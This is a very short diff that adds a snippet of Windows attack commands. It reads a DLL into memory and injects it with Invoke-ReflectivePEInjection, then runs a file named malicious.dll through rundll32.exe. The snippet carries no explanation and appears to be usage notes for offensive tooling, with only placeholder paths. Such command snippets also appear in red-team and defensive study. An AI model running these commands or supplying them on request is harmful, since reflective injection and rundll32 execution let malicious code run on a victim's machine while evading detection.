@@ -1,0 +1,6 @@
+$PEBytes = [IO.File]::ReadAllBytes("C:\Full\Path\To\Your.dll")
+Invoke-ReflectivePEInjection -PEBytes $PEBytes -ForceASLR
+
+
+
+rundll32.exe "C:\Users\Public\malicious.dll",main
